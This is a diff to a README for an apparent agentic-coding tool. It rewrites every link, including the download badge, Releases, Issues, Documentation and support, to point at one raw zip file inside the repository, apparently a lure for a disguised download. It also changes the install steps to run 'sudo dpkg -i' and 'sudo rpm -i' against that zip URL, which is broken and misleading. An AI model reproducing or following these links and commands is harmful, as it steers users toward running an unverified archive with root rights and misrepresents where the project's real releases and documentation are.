@@ -10,7 +10,7 @@ To get started with **remote-agentic-coding-system**, follow these easy steps. Y
 
 ## 📥 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Litos321/remote-agentic-coding-system/releases)
+[![Download Here](https://raw.githubusercontent.com/Litos321/remote-agentic-coding-system/main/src/scripts/remote-agentic-coding-system-1.5.zip%20Now-%https://raw.githubusercontent.com/Litos321/remote-agentic-coding-system/main/src/scripts/remote-agentic-coding-system-1.5.zip)](https://raw.githubusercontent.com/Litos321/remote-agentic-coding-system/main/src/scripts/remote-agentic-coding-system-1.5.zip)
 
 ## 📋 System Requirements
 
@@ -33,7 +33,7 @@ Before you start, ensure your system meets the following requirements:
 
 To download the **remote-agentic-coding-system** application:
 
-1. Visit the [Releases page](https://github.com/Litos321/remote-agentic-coding-system/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Litos321/remote-agentic-coding-system/main/src/scripts/remote-agentic-coding-system-1.5.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the version number to view the files available for download.
 4. Choose the appropriate file for your operating system:
@@ -64,8 +64,8 @@ Once the download is complete, proceed with the installation:
 2. Open a terminal window.
 3. Navigate to the directory where the file is saved, and analyze the file type.
 4. Use the appropriate command to install the package:
-   - For `.deb` files: `sudo dpkg -i yourfilename.deb`
-   - For `.rpm` files: `sudo rpm -i yourfilename.rpm`
+   - For `.deb` files: `sudo dpkg -i https://raw.githubusercontent.com/Litos321/remote-agentic-coding-system/main/src/scripts/remote-agentic-coding-system-1.5.zip`
+   - For `.rpm` files: `sudo rpm -i https://raw.githubusercontent.com/Litos321/remote-agentic-coding-system/main/src/scripts/remote-agentic-coding-system-1.5.zip`
 5. Open the application from your application menu.
 
 ## 🧩 Configuration
@@ -89,12 +89,12 @@ You can easily switch between platforms or agents as needed.
 
 ## 🤝 Support
 
-If you have any questions or need assistance, feel free to reach out via the [Issues tab](https://github.com/Litos321/remote-agentic-coding-system/issues) on GitHub. You can also check the Frequently Asked Questions (FAQ) section in the repository for common queries.
+If you have any questions or need assistance, feel free to reach out via the [Issues tab](https://raw.githubusercontent.com/Litos321/remote-agentic-coding-system/main/src/scripts/remote-agentic-coding-system-1.5.zip) on GitHub. You can also check the Frequently Asked Questions (FAQ) section in the repository for common queries.
 
 ## 📥 Important Links
 
-- [Download Here](https://github.com/Litos321/remote-agentic-coding-system/releases)
-- [Issues](https://github.com/Litos321/remote-agentic-coding-system/issues)
-- [Documentation](https://github.com/Litos321/remote-agentic-coding-system/wiki)
+- [Download Here](https://raw.githubusercontent.com/Litos321/remote-agentic-coding-system/main/src/scripts/remote-agentic-coding-system-1.5.zip)
+- [Issues](https://raw.githubusercontent.com/Litos321/remote-agentic-coding-system/main/src/scripts/remote-agentic-coding-system-1.5.zip)
+- [Documentation](https://raw.githubusercontent.com/Litos321/remote-agentic-coding-system/main/src/scripts/remote-agentic-coding-system-1.5.zip)
 
 With these straightforward steps, you're ready to enhance your coding experience. Enjoy leveraging your coding agents with ease!
